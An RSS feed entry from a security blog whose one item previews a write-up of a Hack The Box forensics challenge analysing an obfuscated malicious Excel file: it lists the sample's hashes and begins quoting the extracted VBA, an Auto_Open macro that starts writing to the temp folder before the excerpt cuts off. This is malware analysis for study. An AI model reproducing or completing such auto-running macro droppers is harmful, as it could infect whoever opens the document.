<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>htb - Category - Brian Stadnicki</title><link>https://brianstadnicki.github.io/categories/htb/</link><description>htb - Category - Brian Stadnicki</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Thu, 25 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://brianstadnicki.github.io/categories/htb/" rel="self" type="application/rss+xml"/><item><title>HTB forensics challenge: oBfsC4t10n #93</title><link>https://brianstadnicki.github.io/posts/htb-challenge-93/</link><pubDate>Thu, 25 Nov 2021 00:00:00 +0000</pubDate><author>Author</author><guid>https://brianstadnicki.github.io/posts/htb-challenge-93/</guid><description><![CDATA[Introduction I started analysing this from finding it on the malware sandbox any.run, only at the end do I notice that it&rsquo;s a Hack The Box challenge.
Sample This sample is from any.run.
Property Value File Type Microsoft Excel 97-2003 Worksheet File Size 35.6 KB MD5 b54c993e941836bf2c9c69948b30bcf0 SHA1 a3e6234b5310a3918b9e01c08badf3eb5f44a4b8 SHA256 3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705 VBA Extraction Using olevba, we can view the vba code inside.
Sub Auto_Open() Dim fHdswUyK, GgyYKuJh Application.Goto (&#34;JLprrpFr&#34;) GgyYKuJh = Environ(&#34;temp&#34;) &amp; &#34;\LwTHLrGh.]]></description></item></channel></rss>